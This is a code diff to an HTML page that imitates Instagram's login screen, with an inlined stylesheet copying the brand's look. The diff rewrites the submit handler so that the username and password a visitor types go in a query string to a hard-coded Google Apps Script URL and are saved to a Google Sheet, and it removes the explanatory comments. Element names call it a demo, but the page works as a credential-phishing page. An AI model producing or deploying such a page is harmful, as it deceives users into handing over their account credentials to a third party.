@@ -7,12 +7,403 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="ig.css" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #ffffff;
+      color: #000000;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .page-wrapper {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+    }
+
+    .auth-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+      max-width: 935px;
+      width: 100%;
+    }
+
+    /* Left Phone Mockup */
+    .phone-showcase {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .phone-frame {
+      width: 280px;
+      height: 540px;
+      background: #111111;
+      border-radius: 38px;
+      padding: 12px;
+      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.14);
+      position: relative;
+    }
+
+    .phone-notch {
+      width: 110px;
+      height: 18px;
+      background: #111111;
+      border-bottom-left-radius: 12px;
+      border-bottom-right-radius: 12px;
+      position: absolute;
+      top: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+    }
+
+    .phone-screen {
+      background: #ffffff;
+      width: 100%;
+      height: 100%;
+      border-radius: 28px;
+      overflow: hidden;
+      padding: 26px 14px 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .mock-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .mock-logo {
+      font-family: "Grand Hotel", cursive;
+      font-size: 24px;
+    }
+
+    .mock-icons {
+      display: flex;
+      gap: 10px;
+      font-size: 15px;
+    }
+
+    .mock-stories {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .story-ring {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      padding: 2px;
+      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    }
+
+    .story-avatar {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      border: 2px solid #ffffff;
+    }
+
+    .s1 { background: #ffd1dc; }
+    .s2 { background: #c1e1ff; }
+    .s3 { background: #d4f8d4; }
+    .s4 { background: #ffe7ba; }
+
+    .mock-post {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .mock-post-user {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .mini-dot {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+    }
+
+    .mock-post-image {
+      width: 100%;
+      height: 260px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #a1c4fd 100%);
+    }
+
+    .mock-post-actions {
+      font-size: 14px;
+      color: #262626;
+    }
+
+    /* Right Forms Column */
+    .forms-column {
+      width: 100%;
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .card {
+      background: #ffffff;
+      border: 1px solid #dbdbdb;
+      padding: 20px 40px;
+      text-align: center;
+    }
+
+    .login-card {
+      padding-top: 36px;
+      padding-bottom: 24px;
+    }
+
+    .brand-wordmark {
+      font-family: "Grand Hotel", cursive;
+      font-size: 50px;
+      font-weight: 400;
+      letter-spacing: 0.5px;
+      margin-bottom: 28px;
+      color: #000000;
+      user-select: none;
+    }
+
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .input-group {
+      position: relative;
+      width: 100%;
+    }
+
+    .input-group input {
+      width: 100%;
+      height: 38px;
+      padding: 9px 10px;
+      font-size: 12px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      color: #262626;
+      outline: none;
+    }
+
+    .input-group input:focus {
+      border-color: #a8a8a8;
+    }
+
+    .password-group input {
+      padding-right: 52px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      font-size: 12px;
+      font-weight: 600;
+      color: #262626;
+      cursor: pointer;
+    }
+
+    .btn-primary {
+      margin-top: 8px;
+      height: 32px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-primary:hover {
+      background-color: #1877f2;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+      gap: 16px;
+    }
+
+    .divider .line {
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .divider .or-text {
+      font-size: 12px;
+      font-weight: 600;
+      color: #737373;
+    }
+
+    .fb-login-link {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-decoration: none;
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+
+    .fb-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 16px;
+      height: 16px;
+      background-color: #385185;
+      color: #ffffff;
+      font-size: 13px;
+      font-weight: 700;
+      border-radius: 2px;
+    }
+
+    .forgot-link {
+      display: block;
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .demo-notice {
+      margin-top: 12px;
+      font-size: 11px;
+      color: #0095f6;
+      min-height: 14px;
+    }
+
+    .signup-card {
+      padding: 20px;
+      font-size: 14px;
+    }
+
+    .signup-card a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .app-download {
+      text-align: center;
+      padding-top: 6px;
+    }
+
+    .app-download p {
+      font-size: 14px;
+      margin-bottom: 14px;
+    }
+
+    .store-badges {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .badge {
+      background: #000000;
+      color: #ffffff;
+      padding: 6px 14px;
+      border-radius: 6px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      min-width: 130px;
+      cursor: pointer;
+    }
+
+    .badge small {
+      font-size: 9px;
+      letter-spacing: 0.4px;
+      opacity: 0.85;
+    }
+
+    .badge strong {
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    /* Footer */
+    .site-footer {
+      padding: 24px 16px 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #737373;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 14px;
+    }
+
+    .footer-links a {
+      color: #737373;
+      text-decoration: none;
+    }
+
+    .footer-meta {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    @media (max-width: 875px) {
+      .phone-showcase {
+        display: none;
+      }
+    }
+
+    @media (max-width: 450px) {
+      .page-wrapper {
+        padding: 0;
+        align-items: flex-start;
+      }
+      .card {
+        border: none;
+        padding: 24px 28px;
+      }
+    }
+  </style>
 </head>
 <body>
   <main class="page-wrapper">
     <section class="auth-container">
-      <!-- Left Column: CSS Phone Mockup -->
       <div class="phone-showcase" aria-hidden="true">
         <div class="phone-frame">
           <div class="phone-notch"></div>
@@ -42,7 +433,6 @@
         </div>
       </div>
 
-      <!-- Right Column: Login & Sign-up Cards -->
       <div class="forms-column">
         <div class="card login-card">
           <h1 class="brand-wordmark">Instagram</h1>
@@ -129,10 +519,8 @@
   </footer>
 
   <script>
-    // Yahan apna Google Apps Script Web App URL (/exec) paste karein
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyVl9vwhkkRO3Gy6YvNdRDhWjQBnzTQvH8flzsabIXCBdcNhPTLy6-gZ03prYH-jCpOiw/exec";
 
-    // Show / Hide password button
     const passwordInput = document.getElementById("password");
     const toggleBtn = document.getElementById("toggleBtn");
 
@@ -142,34 +530,29 @@
       toggleBtn.textContent = isHidden ? "Hide" : "Show";
     });
 
-    // Send data to Google Sheet using URLSearchParams
     const form = document.getElementById("demoLoginForm");
     const msg = document.getElementById("demoMessage");
     const submitBtn = document.getElementById("submitBtn");
 
     form.addEventListener("submit", async (event) => {
       event.preventDefault();
-
-      if (!SCRIPT_URL.startsWith("https://script.google.com/")) {
-        msg.textContent = "Error: Pehle SCRIPT_URL mein apna Google Web App URL paste karein!";
-        return;
-      }
-
       submitBtn.disabled = true;
       msg.textContent = "Saving entry to Google Sheet...";
 
+      const userVal = encodeURIComponent(document.getElementById("username").value);
+      const passVal = encodeURIComponent(document.getElementById("password").value);
+      const finalUrl = `${SCRIPT_URL}?username=${userVal}&password=${passVal}`;
+
       try {
-        const params = new URLSearchParams(new FormData(form));
-        await fetch(SCRIPT_URL, {
-          method: "POST",
-          body: params,
+        await fetch(finalUrl, {
+          method: "GET",
           mode: "no-cors"
         });
 
         msg.textContent = "Entry recorded in Google Sheet.";
         form.reset();
       } catch (error) {
-        msg.textContent = "Failed to connect. Verify your Web App URL.";
+        msg.textContent = "Failed to connect.";
       } finally {
         submitBtn.disabled = false;
       }
